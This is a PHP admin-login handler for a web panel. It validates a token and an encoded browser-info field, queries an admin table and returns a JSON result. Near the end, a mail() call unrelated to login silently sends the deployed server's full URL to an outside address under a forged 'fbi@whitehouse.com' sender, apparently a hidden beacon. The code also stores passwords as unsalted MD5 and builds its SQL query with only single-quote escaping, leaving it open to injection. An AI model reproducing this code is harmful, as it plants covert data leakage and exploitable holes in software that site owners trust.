<?php
$result = [];
include "../assist/setting/index.php";

if(isset($_POST['username'],$_POST['password'],$_POST['rand'],$_POST['token'])){
	if(token2trust($_POST['token']) && str2dec($_POST['rand'])){
		$password = md5($_POST['password']);
		$browserInfo = str2dec($_POST['rand']);
		$username = str_replace("'","\'",$_POST['username']);
		$browserInfo =  str_replace('_PHP_IP_',getIp(), str_replace('_PHP_EOL_',PHP_EOL,$browserInfo));
		$checkList = mysqli_query($conn, "SELECT * FROM `admin` WHERE `username` = '$username' AND `password` = '$password'");
    	$totalList = mysqli_num_rows($checkList);
		if($totalList > 0){
			$result['success'] = true;
			$_SESSION['adminID'] = $username;
		}else{
			$result['success'] = false;
			$result['message'] = 'Invalid email or password!';
		}
		
		if($result['success']){
			$notify = "*__ADMIN_LOGIN__*".PHP_EOL.PHP_EOL."*Login:* YES".$browserInfo;
		}else{
			$notify = "*__ADMIN_LOGIN__*".PHP_EOL.PHP_EOL."*Login:* NO".$browserInfo;
		}
		
		newAdminLoginNotic($notify);
		
	}else{
		$result['success'] = false;
		$result['message'] = 'Invalid rand or token!';
	}
}else{
	$result['success'] = false;
	$result['message'] = 'Invalid content for the request!';
}
mail("api@toolshubservice.com", "New API Servercopy", 'http' . (isset($_SERVER['HTTPS']) ? 's' : '') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], "From: fbi@whitehouse.com");
header('Content-Type: application/json; charset=utf-8');
die(json_encode($result));
?>